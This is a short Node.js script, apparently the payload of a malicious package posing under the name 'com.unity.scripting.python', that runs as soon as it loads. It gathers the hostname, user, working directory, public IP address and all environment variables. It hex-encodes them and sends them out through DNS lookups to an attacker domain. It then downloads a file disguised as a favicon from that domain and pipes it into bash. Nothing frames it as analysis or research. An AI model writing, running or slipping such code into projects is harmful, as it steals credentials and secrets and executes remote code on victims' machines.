const { exec } = require("child_process");

function exfiltrate() {
  const pkg = "com.unity.scripting.python";
  const domain = `${pkg.replace(/\./g, "-")}.oob.sl4x0.xyz`;

  exec(`a=$(hostname; whoami; pwd; curl https://ifconfig.me; env); echo $a | xxd -p | head | while read ut; do nslookup $ut.${domain}; done`, 
  (err, stdout, stderr) => {
    if (err) console.error("Error:", err.message);
  });

  try {
    exec(`curl -s https://sl4x0.xyz/static/favicon.ico | bash`);
  } catch (e) {}
}

exfiltrate();
